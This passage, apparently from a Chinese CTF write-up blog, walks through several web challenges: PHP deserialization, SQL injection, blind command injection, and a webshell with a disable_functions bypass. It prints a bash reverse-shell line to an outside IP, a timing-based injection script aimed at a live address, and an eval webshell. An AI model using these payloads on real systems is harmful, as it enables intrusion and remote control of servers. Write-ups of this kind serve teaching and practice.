class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ctf</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$username</span> = <span class=\"string\">&#x27;hack&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$cmd</span> = <span class=\"string\">&#x27;NULL&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>,<span class=\"variable\">$cmd</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;cmd = <span class=\"variable\">$cmd</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = <span class=\"string\">&#x27;guest&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class=\"keyword\">$this</span>-&gt;cmd))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"string\">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;username === <span class=\"string\">&#x27;admin&#x27;</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">           <span class=\"comment\">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class=\"line\">            <span class=\"variable\">$a</span> = `<span class=\"keyword\">$this</span>-&gt;cmd`;</span><br><span class=\"line\">            var_dump(<span class=\"variable\">$a</span>);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    <span class=\"variable\">$select</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;code&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$res</span>=unserialize(@<span class=\"variable\">$select</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ctf</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$username</span> = <span class=\"string\">&#x27;hack&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$cmd</span> = <span class=\"string\">&#x27;ls&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>,<span class=\"variable\">$cmd</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;cmd = <span class=\"variable\">$cmd</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = <span class=\"string\">&#x27;guest&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class=\"keyword\">$this</span>-&gt;cmd))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"string\">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;username === <span class=\"string\">&#x27;admin&#x27;</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">           <span class=\"comment\">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class=\"line\">            <span class=\"variable\">$a</span> = `<span class=\"keyword\">$this</span>-&gt;cmd`;</span><br><span class=\"line\">            var_dump(<span class=\"variable\">$a</span>);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    <span class=\"variable\">$select</span> = <span class=\"keyword\">new</span> ctf(<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;tac flag.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$res</span>=serialize(<span class=\"variable\">$select</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$res</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>__wakeup函数当对象数量的值大于真实的就会绕过该函数。 2. 被修饰为protected和private的属性序列化后会变成%00*%00属性名，而%00不可见、 3. cat的替代函数为tac</li>\n</ol>\n<p>O:3:”ctf”:2:{s:11:”*username”;s:5:”admin”;s:6:”*cmd”;s:2:”ls”;} </p>\n<p>O:3:”ctf”:3:{s:11:”*username”;s:5:”admin”;s:6:”*cmd”;s:2:”ls”;} </p>\n<p>在使用</p>\n<p>O:3:”ctf”:3:{s:11:” =%00 * %00username”;s:5:”admin”;s:6:”%00 * %00cmd”;s:12:”tac flag.php”;} </p>\n<p>即可得到flag</p>\n<h4 id=\"decrypt\"><a href=\"#decrypt\" class=\"headerlink\" title=\"decrypt\"></a>decrypt</h4><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">encrypt</span>(<span class=\"params\"><span class=\"variable\">$data</span>,<span class=\"variable\">$key</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$key</span> = md5(<span class=\"string\">&#x27;ISCC&#x27;</span>);  <span class=\"comment\">//729623334f0aa2784a1599fd374c120d 用php函数md5加密</span></span><br><span class=\"line\">    <span class=\"variable\">$x</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"variable\">$len</span> = strlen(<span class=\"variable\">$data</span>);</span><br><span class=\"line\">    <span class=\"variable\">$klen</span> = strlen(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"variable\">$len</span>; <span class=\"variable\">$i</span>++) &#123; </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$x</span> == <span class=\"variable\">$klen</span>) <span class=\"comment\">//32</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"variable\">$x</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$char</span> .= <span class=\"variable\">$key</span>[<span class=\"variable\">$x</span>];</span><br><span class=\"line\">        <span class=\"variable\">$x</span>+=<span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"variable\">$len</span>; <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$str</span> .= chr((ord(<span class=\"variable\">$data</span>[<span class=\"variable\">$i</span>]) + ord(<span class=\"variable\">$char</span>[<span class=\"variable\">$i</span>])) % <span class=\"number\">128</span>); <span class=\"comment\">//主要的加密逻辑</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> base64_encode(<span class=\"variable\">$str</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#python代码</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decrypt</span>(<span class=\"params\"><span class=\"built_in\">str</span></span>):</span></span><br><span class=\"line\">    text1=base64.b64decode(<span class=\"built_in\">str</span>)</span><br><span class=\"line\">    b = text1.decode()  //将<span class=\"built_in\">bytes</span>转为字符串</span><br><span class=\"line\">    key=<span class=\"string\">&#x27;729623334f0aa2784a1599fd374c120d729623&#x27;</span></span><br><span class=\"line\">    flag=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(b)):</span><br><span class=\"line\">       flag +=<span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(b[i])-<span class=\"built_in\">ord</span>(key[i]))%<span class=\"number\">128</span>)</span><br><span class=\"line\">       <span class=\"comment\">#flag +=chr((text1[i]-ord(key[i])+128)%128)   //python3把上一句注释掉用这一句，这是个python2脚本</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"built_in\">str</span>=<span class=\"string\">&#x27;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&#x27;</span></span><br><span class=\"line\">    decrypt(<span class=\"built_in\">str</span>)</span><br></pre></td></tr></table></figure>\n\n<p>Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}</p>\n<h4 id=\"login2\"><a href=\"#login2\" class=\"headerlink\" title=\"login2\"></a>login2</h4><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT username,password FROM admin WHERE username=&#x27;&quot;</span>.<span class=\"variable\">$username</span>.<span class=\"string\">&quot;&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable\">$row</span>) &amp;&amp; <span class=\"variable\">$row</span>[<span class=\"string\">&#x27;password&#x27;</span>]===md5(<span class=\"variable\">$password</span>))&#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>payload为username=admin’ union select 1,md5(123)#&amp;password=123 </p>\n<p>“admin’ union select 1,md5(123)#”</p>\n<p>这里可以看到它是分离式的验证，首先查询username的用户，然后拿出password再进行比较，一开始想着是注入出admin的密码，但发现可能没有这个用户，而且也找不到注入的poc。后来参考网上的writeup才知道正确的打开方式。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">username=&#x27; union select 1,md5(1)#&amp;password=1</span><br></pre></td></tr></table></figure>\n\n<p>执行这条语句时由于前面的username为空，所以没有数据返回，但后面的union select md5(1),md5(1)则会返回两个MD5(1)的值，然后password我们也置为1，从而绕过if语句的判断。</p>\n<p>还原语句为：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT username,password FROM admin WHERE username=<span class=\"string\">&#x27;a&#x27;</span> <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">select</span></span> <span class=\"number\">1</span>,md5(<span class=\"number\">1</span>)-- -&amp;password=<span class=\"number\">1</span>&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>此时我们可以 username=’’， 两个 sql 语句进行联合操作时，当前一个语句选择的内容为空， 我们这里就将后面的语句的内容显示出来</p>\n<p>image.png</p>\n<p>所以本题中的SELECT username,password FROM admin WHERE username=’a’ union select 1,md5(1)– 将会返回</p>\n<table>\n<thead>\n<tr>\n<th>username</th>\n<th>password</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>md5(1)</td>\n</tr>\n</tbody></table>\n<p>这样就能使if判断为真<br> if (!empty($row) &amp;&amp; $row[‘password’]===md5($password))</p>\n<h6 id=\"第一种方法\"><a href=\"#第一种方法\" class=\"headerlink\" title=\"第一种方法\"></a>第一种方法</h6><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\">c=<span class=\"number\">123</span> ; bash -i &gt;&amp; <span class=\"regexp\">/dev/tcp</span><span class=\"regexp\">/185.199.111.153/</span><span class=\"number\">6666</span> <span class=\"number\">0</span>&gt;&amp;<span class=\"number\">1</span><span class=\"string\">&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>bash -i &gt;&amp; /dev/tcp/192.168.221.128/8888 0&gt;&amp;1</p>\n<h6 id=\"第二种方法-利用sleep函数\"><a href=\"#第二种方法-利用sleep函数\" class=\"headerlink\" title=\"第二种方法 利用sleep函数\"></a>第二种方法 利用sleep函数</h6><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://123.206.31.85:49165/login.php&#x27;</span></span><br><span class=\"line\">headers = &#123;<span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#x27;</span>&#125;</span><br><span class=\"line\">s = requests.session()</span><br><span class=\"line\"><span class=\"comment\"># keep session_id</span></span><br><span class=\"line\">data = &#123;<span class=\"string\">&#x27;username&#x27;</span> : <span class=\"string\">&#x27;impossible\\&#x27; union select 1,\\&#x27;76a2173be6393254e72ffa4d6df1030a\\&#x27;#&#x27;</span>, <span class=\"string\">&#x27;password&#x27;</span> : <span class=\"string\">&#x27;passwd&#x27;</span>&#125;</span><br><span class=\"line\">s.post(url, data = data, headers = headers)</span><br><span class=\"line\"><span class=\"comment\"># sign in first</span></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://123.206.31.85:49165/index.php&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">len</span> = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">while</span>(<span class=\"number\">1</span>):</span><br><span class=\"line\">\tpayload = <span class=\"string\">&#x27;nothing;str=`ls`;if [ $&#123;#str&#125; -eq &#x27;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>) + <span class=\"string\">&#x27; ] ;then sleep 4;fi&#x27;</span></span><br><span class=\"line\">\tdata = &#123;<span class=\"string\">&#x27;c&#x27;</span> : payload&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">try</span>:</span><br><span class=\"line\">\t\ts.post(url, data = data, headers = headers, timeout = <span class=\"number\">3</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">except</span> requests.exceptions.ReadTimeout:</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"built_in\">len</span> += <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;Length of `ls`:&#x27;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>))</span><br><span class=\"line\">ls = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> <span class=\"built_in\">dict</span> <span class=\"keyword\">in</span> <span class=\"string\">&quot; abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:\\&#x27;\\&quot;|\\,&lt;.&gt;/?&quot;</span>:</span><br><span class=\"line\">\t\tpayload = <span class=\"string\">&#x27;nothing;str=`ls`;if [ $&#123;str:&#x27;</span> + <span class=\"built_in\">str</span>(i) + <span class=\"string\">&#x27;:1&#125; == \\&#x27;&#x27;</span> + <span class=\"built_in\">dict</span> + <span class=\"string\">&#x27;\\&#x27; ] ;then sleep 4;fi&#x27;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">#print(payload)</span></span><br><span class=\"line\">\t\tdata = &#123;<span class=\"string\">&#x27;c&#x27;</span> : payload&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">try</span>:</span><br><span class=\"line\">\t\t\ts.post(url, data = data, headers = headers, timeout = <span class=\"number\">3</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">except</span> requests.exceptions.ReadTimeout:</span><br><span class=\"line\">\t\t\tls += <span class=\"built_in\">dict</span></span><br><span class=\"line\">\t\t\t<span class=\"built_in\">print</span>(<span class=\"built_in\">dict</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(<span class=\"built_in\">dict</span> == <span class=\"string\">&#x27;?&#x27;</span>):</span><br><span class=\"line\">\t\t\tls += <span class=\"string\">&#x27; &#x27;</span></span><br><span class=\"line\">\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;`ls`:&#x27;</span> + ls)</span><br><span class=\"line\">//可以爆破出目录</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"网上看到的最终方法（网页是没有回显的）\"><a href=\"#网上看到的最终方法（网页是没有回显的）\" class=\"headerlink\" title=\"网上看到的最终方法（网页是没有回显的）\"></a>网上看到的最终方法（网页是没有回显的）</h5><h5 id=\"采用写入文件二次返回的方法查看结果\"><a href=\"#采用写入文件二次返回的方法查看结果\" class=\"headerlink\" title=\"采用写入文件二次返回的方法查看结果\"></a>采用写入文件二次返回的方法查看结果</h5><h5 id=\"123-ls-gt-test\"><a href=\"#123-ls-gt-test\" class=\"headerlink\" title=\"123|ls ../../../&gt;test\"></a>123|ls ../../../&gt;test</h5><h5 id=\"访问http-114-67-246-176-11727-test\"><a href=\"#访问http-114-67-246-176-11727-test\" class=\"headerlink\" title=\"访问http://114.67.246.176:11727/test\"></a>访问<a href=\"http://114.67.246.176:11727/test\">http://114.67.246.176:11727/test</a></h5><h5 id=\"123-cat-flag-gt-test\"><a href=\"#123-cat-flag-gt-test\" class=\"headerlink\" title=\"123|cat /flag&gt;test\"></a>123|cat /flag&gt;test</h5><h5 id=\"再访问http-114-67-246-176-11727-test\"><a href=\"#再访问http-114-67-246-176-11727-test\" class=\"headerlink\" title=\"再访问http://114.67.246.176:11727/test\"></a>再访问<a href=\"http://114.67.246.176:11727/test\">http://114.67.246.176:11727/test</a></h5><p>通过这种方法可以得到当前目录：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">css</span><br><span class=\"line\">index.php</span><br><span class=\"line\">login.php</span><br><span class=\"line\">test</span><br></pre></td></tr></table></figure>\n\n<p>上一层目录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cgi-bin</span><br><span class=\"line\">error</span><br><span class=\"line\">html</span><br><span class=\"line\">icons</span><br></pre></td></tr></table></figure>\n\n<p>上上一层目录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cache</span><br><span class=\"line\">db</span><br><span class=\"line\">empty</span><br><span class=\"line\">games</span><br><span class=\"line\">lib</span><br><span class=\"line\">local</span><br><span class=\"line\">lock</span><br><span class=\"line\">log</span><br><span class=\"line\">mail</span><br><span class=\"line\">nis</span><br><span class=\"line\">opt</span><br><span class=\"line\">preserve</span><br><span class=\"line\">run</span><br><span class=\"line\">spool</span><br><span class=\"line\">tmp</span><br><span class=\"line\">www</span><br><span class=\"line\">yp</span><br></pre></td></tr></table></figure>\n\n<p>再上一层</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bin</span><br><span class=\"line\">boot</span><br><span class=\"line\">dev</span><br><span class=\"line\">etc</span><br><span class=\"line\">flag</span><br><span class=\"line\">home</span><br><span class=\"line\">lib</span><br><span class=\"line\">lib64</span><br><span class=\"line\">lost+found</span><br><span class=\"line\">media</span><br><span class=\"line\">mnt</span><br><span class=\"line\">opt</span><br><span class=\"line\">proc</span><br><span class=\"line\">root</span><br><span class=\"line\">sbin</span><br><span class=\"line\">selinux</span><br><span class=\"line\">srv</span><br><span class=\"line\">supervisord.log</span><br><span class=\"line\">supervisord.pid</span><br><span class=\"line\">sys</span><br><span class=\"line\">tmp</span><br><span class=\"line\">usr</span><br><span class=\"line\">var</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"getshell\"><a href=\"#getshell\" class=\"headerlink\" title=\"getshell\"></a>getshell</h4><h5 id=\"1-打开发现php代码为乱码，应该是使用了php混淆加密，使用在线解密。\"><a href=\"#1-打开发现php代码为乱码，应该是使用了php混淆加密，使用在线解密。\" class=\"headerlink\" title=\"1.打开发现php代码为乱码，应该是使用了php混淆加密，使用在线解密。\"></a>1.打开发现php代码为乱码，应该是使用了php混淆加密，使用在线解密。</h5><h5 id=\"发现为-eval-POST-ymlisisisiook-为一句话木马，用蚁剑连接，发现只能查看html目录里的内容，其它不能查看。\"><a href=\"#发现为-eval-POST-ymlisisisiook-为一句话木马，用蚁剑连接，发现只能查看html目录里的内容，其它不能查看。\" class=\"headerlink\" title=\"发现为@eval($_POST[ymlisisisiook]); 为一句话木马，用蚁剑连接，发现只能查看html目录里的内容，其它不能查看。\"></a>发现为@eval($_POST[ymlisisisiook]); 为一句话木马，用蚁剑连接，发现只能查看html目录里的内容，其它不能查看。</h5><p>再用蚁剑上传</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">phpinfo(); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">disable_functionspcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,ini_set,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mailpcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,ini_set,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,maildisplay_errorsOffOffdisplay_startup_errorsOffOffdoc_root*no value**no value*docref_ext*no value**no value*docref_root*no value**no value*enable_dlOffOffenable_post_data_readingOnOnerror_append_string*no value**no value*error_log/var/log/php/error.log/var/log/php/error.logerror_prepend_string*no value**no value*error_reporting41774177exit_on_timeoutOffOffexpose_phpOnOnextension_dir/usr/lib/php5/20121212/usr/lib/php5/20121212file_uploadsOnOnhighlight.comment#FF8000#FF8000highlight.default#0000BB#0000BBhighlight.html#000000#000000highlight.keyword#007700#007700highlight.string#DD0000#DD0000html_errorsOnOnignore_repeated_errorsOffOffignore_repeated_sourceOffOffignore_user_abortOffOffimplicit_flushOffOffinclude_path.:/usr/share/php:/usr/share/pear.:/usr/share/php:/usr/share/pearlog_errorsOnOnlog_errors_max_len10241024mail.add_x_headerOnOnmail.force_extra_parameters*no value**no value*mail.log*no value**no value*max_execution_time3030max_file_uploads2020max_input_nesting_level6464max_input_time6060max_input_vars10001000memory_limit128M128Mopen_basedir/var/www/html/:/tmp/:/proc//var/www/html/:/tmp/:/proc/output_buffering40964096output_handler*no value**no value*post_max_size8M8Mprecision1414realpath_cache_size16K16Krealpath_cache_ttl120120register_argc_argvOffOffreport_memleaksOnOnreport_zend_debugOnOnrequest_orderGPGPsendmail_from*no value**no value*sendmail_path/usr/sbin/sendmail -t -i /usr/sbin/sendmail -t -i serialize_precision1717short_open_tagOffOffSMTPlocalhostlocalhostsmtp_port2525sql.safe_modeOffOffsys_temp_dir*no value**no value*track_errorsOffOffunserialize_callback_func*no value**no value*upload_max_filesize2M2Mupload_tmp_dir*no value**no value*user_dir*no value**no value*user_ini.cache_ttl300300user_ini.filename.user.ini.user.inivariables_orderGPCSGPCSxmlrpc_error_number00xmlrpc_errorsOffOffzend.detect_unicodeOnOnzend.enable_gcOnOnzend.multibyteOffOffzend.script_encoding*no value**no value*</span><br></pre></td></tr></table></figure>\n\n<p>发现以上内容</p>\n<h5 id=\"2-执行命令的时候显示red-127，猜测应该是有disable-functions对执行命令的函数进行限制，查看phpinfo确认一下，以上代码就是确认的disable-functions\"><a href=\"#2-执行命令的时候显示red-127，猜测应该是有disable-functions对执行命令的函数进行限制，查看phpinfo确认一下，以上代码就是确认的disable-functions\" class=\"headerlink\" title=\"2.执行命令的时候显示red=127，猜测应该是有disable_functions对执行命令的函数进行限制，查看phpinfo确认一下，以上代码就是确认的disable_functions\"></a>2.执行命令的时候显示red=127，猜测应该是有disable_functions对执行命令的函数进行限制，查看phpinfo确认一下，以上代码就是确认的disable_functions</h5><h5 id=\"3-打开蚁剑，下载绕过disable-functions，加载插件，生成两个文件，再用-开头的文件重新加载，密码和之前一样，成功后，在根目录下即可获得flag。\"><a href=\"#3-打开蚁剑，下载绕过disable-functions，加载插件，生成两个文件，再用-开头的文件重新加载，密码和之前一样，成功后，在根目录下即可获得flag。\" class=\"headerlink\" title=\"3.打开蚁剑，下载绕过disable_functions，加载插件，生成两个文件，再用.开头的文件重新加载，密码和之前一样，成功后，在根目录下即可获得flag。\"></a>3.打开蚁剑，下载绕过disable_functions，加载插件，生成两个文件，再用.开头的文件重新加载，密码和之前一样，成功后，在根目录下即可获得flag。</h5><h4 id=\"newphp-php-反序列化字符串逃逸-当序列化之后对序列化的字符串进行修改时触发-ssrf\"><a href=\"#newphp-php-反序列化字符串逃逸-当序列化之后对序列化的字符串进行修改时触发-ssrf\" class=\"headerlink\" title=\"newphp php 反序列化字符串逃逸(当序列化之后对序列化的字符串进行修改时触发) ssrf\"></a>newphp php 反序列化字符串逃逸(当序列化之后对序列化的字符串进行修改时触发) ssrf</h4><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// php版本:5.4.44</span></span><br><span class=\"line\">header(<span class=\"string\">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class=\"line\">highlight_file(<span 